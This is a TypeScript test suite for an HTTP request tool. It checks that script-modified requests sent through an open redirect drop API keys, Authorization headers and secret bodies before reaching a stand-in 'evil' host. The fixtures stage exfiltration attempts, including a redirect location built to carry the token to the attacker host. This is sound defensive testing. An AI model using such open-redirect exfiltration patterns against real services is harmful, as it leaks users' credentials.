import { afterEach, beforeEach, describe, expect, it } from 'vitest';

import {
    carriesSecret,
    KEY_LINE,
    line,
    scripts,
    startAttack,
    type Attack,
} from './support/attack-fixture.js';
import { SECRET } from './support/send-fixture.js';

let attack: Attack;

beforeEach(async () => {
    attack = await startAttack();
});

afterEach(async () => {
    await attack.stop();
});

/** The open redirect of `api`: a hop to `evil`, with the status it is asked for. */
function openTo(target: string, status = 307): string {
    return `{{baseUrl}}/open?status=${String(status)}&to=${encodeURIComponent(target)}`;
}

function strippedOf(answer: Awaited<ReturnType<Attack['send']>>): string[] {
    return answer.ok
        ? answer.value.redirects.flatMap(({ strippedHeaders }) => strippedHeaders)
        : [];
}

function heldAt(): string | undefined {
    return attack.told.find(({ phase }) => phase === 'before')?.heldAt;
}

describe('a send a script shaped, sent with a secret to an open redirect', () => {
    it('follows the hop without the secret lines, whatever the script wrote, and names them', async () => {
        const hop = `${attack.evil.url}/hop`;
        const shaped = [
            {
                url: '{{baseUrl}}/echo',
                ...scripts(`request.url = '${attack.origin}/open?to=${hop}';`),
            },
            { url: '{{baseUrl}}/open', ...scripts(`request.query.set('to', '${hop}');`) },
            { url: openTo(hop), ...scripts(`request.headers.set('X-Run', '1');`) },
            {
                method: 'POST',
                url: openTo(hop),
                body: { type: 'json' as const, content: '{}' },
                ...scripts(`request.body = '{"next":1}';`),
            },
        ];

        for (const request of shaped) {
            const answer = await attack.send({ ...request, headers: [KEY_LINE] });

            expect(strippedOf(answer)).toContain('x-api-key');
        }

        expect(attack.evil.hits).toHaveLength(4);
        expect(attack.evil.hits.filter(carriesSecret)).toEqual([]);
        expect(attack.evil.hits.at(-1)?.body).toBe('{"next":1}');
    });

    it('drops a secret Authorization at the hop, though the request keeps it on redirects', async () => {
        const answer = await attack.send({
            url: openTo(`${attack.evil.url}/hop`),
            headers: [line('Authorization', 'Bearer {{token}}')],
            settings: { followAuthorizationOnRedirect: true },
            ...scripts(`request.headers.set('X-Run', '1');`),
        });

        expect(strippedOf(answer)).toContain('authorization');
        expect(attack.evil.hits.filter(carriesSecret)).toEqual([]);
    });

    it('drops the Authorization of a secret auth at the hop, though the request keeps it', async () => {
        const answer = await attack.send({
            url: openTo(`${attack.evil.url}/hop`),
            auth: { type: 'bearer', token: '{{token}}' },
            settings: { followAuthorizationOnRedirect: true },
            ...scripts(`request.headers.set('X-Run', '1');`),
        });

        expect(answer.ok).toBe(true);
        expect(attack.received[0]?.headers.authorization).toBe(`Bearer ${SECRET}`);
        expect(attack.evil.hits.filter(carriesSecret)).toEqual([]);
    });

    it('counts a line that reads a value of a script as shaped, with no script writing', async () => {
        await attack.send({ url: '{{baseUrl}}/echo', ...scripts(`vars.set('n', '2');`) });

        const answer = await attack.send({
            url: openTo(`${attack.evil.url}/hop`),
            headers: [KEY_LINE, line('X-Next', '{{n}}')],
        });

        expect(strippedOf(answer)).toContain('x-api-key');
        expect(attack.evil.hits[0]?.headers['x-next']).toBe('2');
        expect(attack.evil.hits.filter(carriesSecret)).toEqual([]);
    });

    it('stays at the 3xx when the hop would carry a secret body of the person', async () => {
        const answer = await attack.send({
            method: 'POST',
            url: openTo(`${attack.evil.url}/hop`),
            body: { type: 'text', content: '{{token}}' },
            ...scripts(`request.headers.set('X-Run', '1');`),
        });

        expect(answer).toMatchObject({ ok: true, value: { status: 307 } });
        expect(heldAt()).toContain('/open');
        expect(attack.evil.hits).toEqual([]);
        expect(attack.received[0]?.body).toBe(SECRET);
    });

    it('stays at the 3xx when the location the server built holds the secret', async () => {
        const answer = await attack.send({
            url: `{{baseUrl}}/open?to=${encodeURIComponent(`${attack.evil.url}/x?k=`)}{{token}}`,
            ...scripts(`request.headers.set('X-Run', '1');`),
        });

        expect(answer).toMatchObject({ ok: true, value: { status: 307 } });
        expect(heldAt()).toBeDefined();
        expect(attack.evil.hits).toEqual([]);
    });

    it('follows a 302 after a POST with a secret body as a GET, without the body or the line', async () => {
        const answer = await attack.send({
            method: 'POST',
            url: openTo(`${attack.evil.url}/hop`, 302),
            headers: [KEY_LINE],
            body: { type: 'text', content: '{{token}}' },
            ...scripts(`request.headers.set('X-Run', '1');`),
        });

        expect(answer.ok).toBe(true);
        expect(attack.evil.hits).toMatchObject([{ method: 'GET', body: '' }]);
        expect(attack.evil.hits.filter(carriesSecret)).toEqual([]);
    });
});

describe('a redirect the scripts had no hand in, as today', () => {
    it('sends the secret of the person to api when no script runs', async () => {
        await attack.send({ url: '{{baseUrl}}/echo', headers: [KEY_LINE] });

        expect(attack.received[0]?.headers['x-api-key']).toBe(SECRET);
    });

    it('takes X-Api-Key along to another origin when the scripts only read and test', async () => {
        await attack.send({
            url: openTo(`${attack.evil.url}/hop`),
            headers: [KEY_LINE],
            ...scripts(`test('has a key', () => request.headers.has('x-api-key'));`),
        });

        expect(attack.evil.hits[0]?.headers['x-api-key']).toBe(SECRET);
    });

    it('follows a shaped send with no secret, and a shaped hop that stays in the origin', async () => {
        const shaping = scripts(`request.headers.set('X-Run', '1');`);
        const plain = await attack.send({
            url: openTo(`${attack.evil.url}/hop`),
            headers: [line('X-Api-Key', 'plain')],
            ...shaping,
        });
        const inside = await attack.send({
            url: openTo('/echo'),
            headers: [KEY_LINE],
            ...shaping,
        });

        expect([strippedOf(plain), strippedOf(inside)]).toEqual([[], []]);
        expect(attack.evil.hits[0]?.headers['x-api-key']).toBe('plain');
        expect(attack.received.at(-1)?.headers['x-api-key']).toBe(SECRET);
    });
});
